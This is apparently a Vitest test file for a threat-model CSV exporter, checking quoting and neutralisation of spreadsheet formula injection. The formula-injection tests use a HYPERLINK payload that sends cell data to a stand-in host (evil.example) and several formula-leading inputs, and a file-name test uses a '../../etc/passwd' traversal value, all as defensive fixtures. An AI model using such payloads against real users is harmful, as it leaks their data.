/**
 * exportCsv: the threat list as CSV. Plain Node.
 *
 * A hostile title must never become a spreadsheet formula, and no field may break out of
 * its quotes, so these read the output back with a small RFC 4180 parser instead of
 * pattern-matching the text.
 */

import { describe, expect, it } from "vitest";
import { CSV_COLUMNS, buildThreatsCsv, csvField, csvRow, exportFileName } from "@/client/exportCsv";
import type { ThreatCardData } from "@/shared/viewModel";

/** Reads CSV text (quoted fields, doubled quotes, CRLF or LF) back into rows of fields. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') {
        field += '"';
        i += 1;
      } else if (c === '"') quoted = false;
      else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") {
      row.push(field);
      field = "";
    } else if (c === "\r" || c === "\n") {
      if (c === "\r" && text[i + 1] === "\n") i += 1;
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else field += c;
  }
  if (field !== "" || row.length) {
    row.push(field);
    rows.push(row);
  }
  return rows;
}

function threat(over: Partial<ThreatCardData> = {}): ThreatCardData {
  return {
    id: "threat-1",
    title: "SQL injection in note search",
    severity: "high",
    confidence: 70,
    confidenceLabel: "high",
    priority: "fix_now",
    priorityLabel: "Fix now",
    stride: [
      { code: "T", label: "Tampering" },
      { code: "I", label: "Information disclosure" },
    ],
    owasp: [{ code: "A05:2025", label: "Injection" }],
    cwe: ["CWE-89", "CWE-20"],
    basis: "evidence_backed",
    basisLabel: "Confirmed by evidence",
    componentNames: ["API Server", "Postgres Database"],
    affectedNames: ["API Server", "Postgres Database", "API Server → Postgres Database"],
    componentIds: ["api", "db"],
    dataFlowIds: [],
    confidenceReasons: [],
    attackScenario: "x",
    evidence: [
      { kind: "code", kindLabel: "Code", summary: "s1", location: "src/notes.ts:41-44", snippet: null, sourceLabel: "Code analysis" },
      { kind: "inference", kindLabel: "Inference", summary: "s2", location: null, snippet: null, sourceLabel: "AI analysis" },
      { kind: "code", kindLabel: "Code", summary: "s3", location: "src/db.ts:9", snippet: null, sourceLabel: "Code analysis" },
    ],
    mitigation: { summary: "Use parameterised queries.", steps: ["a"], codeLocation: null },
    assumptions: [],
    ...over,
  } as ThreatCardData;
}

describe("buildThreatsCsv", () => {
  it("has the thirteen columns, in order, and one row per threat", () => {
    const rows = parseCsv(buildThreatsCsv([threat(), threat({ id: "threat-2", title: "Other" })]));
    expect(CSV_COLUMNS).toHaveLength(13);
    expect(rows[0]).toEqual([
      "id", "title", "severity", "confidence", "priority", "basis", "STRIDE", "OWASP", "CWE",
      "components", "status", "evidence", "mitigation",
    ]);
    expect(rows).toHaveLength(3);
    expect(rows[2][1]).toBe("Other");
  });

  it("fills each column from the threat as the server scored it", () => {
    const [, row] = parseCsv(buildThreatsCsv([threat()], { "threat-1": "accepted_risk" }));
    expect(row).toEqual([
      "threat-1",
      "SQL injection in note search",
      "high",
      "70",
      "fix_now",
      "evidence_backed",
      "T; I",
      "A05:2025",
      "CWE-89; CWE-20",
      "API Server; Postgres Database",
      "accepted_risk",
      "src/notes.ts:41-44; src/db.ts:9",
      "Use parameterised queries.",
    ]);
  });

  it("says open for a threat with no stored status, and keeps the order it was given", () => {
    const rows = parseCsv(
      buildThreatsCsv([threat({ id: "b" }), threat({ id: "a" })], { a: "fixed" }),
    );
    expect(rows.slice(1).map((r) => [r[0], r[10]])).toEqual([["b", "open"], ["a", "fixed"]]);
  });

  it("is just the header for no threats, and ends every line with CRLF", () => {
    const text = buildThreatsCsv([]);
    expect(parseCsv(text)).toHaveLength(1);
    expect(text.endsWith("\r\n")).toBe(true);
    expect(buildThreatsCsv([threat()]).split("\r\n")).toHaveLength(3);
  });

  it("quotes every field, including numbers and empty ones", () => {
    const line = buildThreatsCsv([threat({ cwe: [], mitigation: { summary: "", steps: [], codeLocation: null } })])
      .split("\r\n")[1];
    expect(line.startsWith('"threat-1","SQL injection')).toBe(true);
    expect(line).toContain(',"70",');
    expect(line.endsWith(',""')).toBe(true);
    expect(parseCsv(line)[0]).toHaveLength(13);
  });

  it("starts the cell with a quote for a title that would be a formula", () => {
    const title = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
    const text = buildThreatsCsv([threat({ title })]);
    const cell = parseCsv(text)[1][1];
    expect(cell).toBe(`'${title}`);
    // And in the raw text: the quote is inside the quoted cell, before the equals sign.
    expect(text).toContain(`,"'=HYPERLINK(`);
    expect(text).not.toContain(`,"=HYPERLINK`);
  });

  it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rcmd"])(
    "neutralises a field that starts with %j, in any column",
    (hostile) => {
      const row = parseCsv(
        buildThreatsCsv([
          threat({
            id: hostile,
            title: hostile,
            componentNames: [hostile],
            cwe: [hostile],
            evidence: [{ kind: "code", kindLabel: "Code", summary: "s", location: hostile, snippet: null, sourceLabel: "x" }],
            mitigation: { summary: hostile, steps: [], codeLocation: null },
          }),
        ]),
      )[1];
      for (const index of [0, 1, 8, 9, 11, 12]) expect(row[index]).toBe(`'${hostile}`);
    },
  );

  it("leaves a field alone when a dangerous character is not first", () => {
    expect(parseCsv(buildThreatsCsv([threat({ title: "Not =a formula" })]))[1][1]).toBe("Not =a formula");
  });

  it("round-trips a title with a comma and a quote", () => {
    const title = 'Admin says "hello, world" and, more, commas';
    const rows = parseCsv(buildThreatsCsv([threat({ title })]));
    expect(rows[1][1]).toBe(title);
    expect(rows[1]).toHaveLength(13);
  });

  it("round-trips line breaks and non-ASCII text inside a field", () => {
    const summary = "Step one,\r\nstep \"two\"\nstep three: données, 日本語";
    const rows = parseCsv(buildThreatsCsv([threat({ mitigation: { summary, steps: [], codeLocation: null } })]));
    expect(rows).toHaveLength(2);
    expect(rows[1][12]).toBe(summary);
  });

  it("does not change the threats it is given", () => {
    const input = [threat()];
    const before = JSON.stringify(input);
    buildThreatsCsv(input, { "threat-1": "fixed" });
    expect(JSON.stringify(input)).toBe(before);
  });

  it("copes with a threat missing optional lists", () => {
    const bare = { id: "x", title: "t", severity: "low", confidence: 5, priority: "monitor", basis: "assumption_dependent" } as unknown as ThreatCardData;
    expect(parseCsv(buildThreatsCsv([bare]))[1]).toEqual([
      "x", "t", "low", "5", "monitor", "assumption_dependent", "", "", "", "", "open", "", "",
    ]);
  });
});

describe("csvField and csvRow", () => {
  it("wraps in quotes and doubles embedded quotes", () => {
    expect(csvField('a"b')).toBe('"a""b"');
    expect(csvField(42)).toBe('"42"');
    expect(csvField("")).toBe('""');
  });

  it("prefixes before quoting, so the quote sits inside the cell", () => {
    expect(csvField('=A1"')).toBe(`"'=A1"""`);
  });

  it("gives one raw value per column", () => {
    expect(csvRow(threat(), "open")).toHaveLength(CSV_COLUMNS.length);
  });
});

describe("exportFileName", () => {
  it("makes a safe file name from the repository name", () => {
    expect(exportFileName("acme/acme-notes", "csv")).toBe("acme-acme-notes-threats.csv");
    expect(exportFileName("a/b", "json")).toBe("a-b-threat-model.json");
    expect(exportFileName("../../etc/passwd", "csv")).toBe("etc-passwd-threats.csv");
  });

  it("falls back to a fixed name", () => {
    expect(exportFileName(undefined, "csv")).toBe("attackcanvas-threats.csv");
    expect(exportFileName("///", "json")).toBe("attackcanvas-threat-model.json");
  });
});
